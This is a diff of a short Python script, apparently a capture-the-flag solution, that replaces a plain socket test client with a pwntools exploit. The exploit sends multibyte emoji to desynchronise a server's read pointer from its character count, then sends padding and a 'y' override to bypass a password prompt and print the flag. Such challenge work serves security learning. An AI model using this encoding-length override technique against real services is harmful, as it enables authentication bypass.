@@ -1,36 +1,19 @@
-import socket
+from pwn import *
+import time
+import re
 
-# Define the server address and port
-server_address = ('localhost', 12367)  # Replace with your server's address and port
+r = remote('localhost', 12367, level='debug')
 
-# Create a TCP/IP socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Receive prompt
+r.recvuntil(b'Enter the password:\n')
 
-try:
-    # Connect to the server
-    sock.connect(server_address)
-    
-    # Prepare the message
-    message = "abcdefghijy" + "\0" + "\n"
-    
-    # Send the message
-    sock.sendall(message.encode())
+# Send two 4 byte emojis, advances readPtr by 8 but keeps length at 2
+r.send('🗿🗿'.encode())
 
-    try:
-        response = sock.recv(4096)  # Increase buffer size
-        print("Received:", response.decode())
-    except socket.timeout:
-        print("No response received within the timeout period.")
+# Wait a second to make sure that both packets are handled separately, otherwise the max_length limit gets reached
+time.sleep(1)
 
+# Send two bytes of padding and the "y" override
+r.send(b'__y\x00')
 
-
-    
-    try:
-        response = sock.recv(4096)  # Increase buffer size
-        print("Received:", response.decode())
-    except socket.timeout:
-        print("No response received within the timeout period.")
-
-finally:
-    # Close the socket
-    sock.close()
+print(re.search(r"flag-[\w-]+", r.recvall().decode()).group(0))
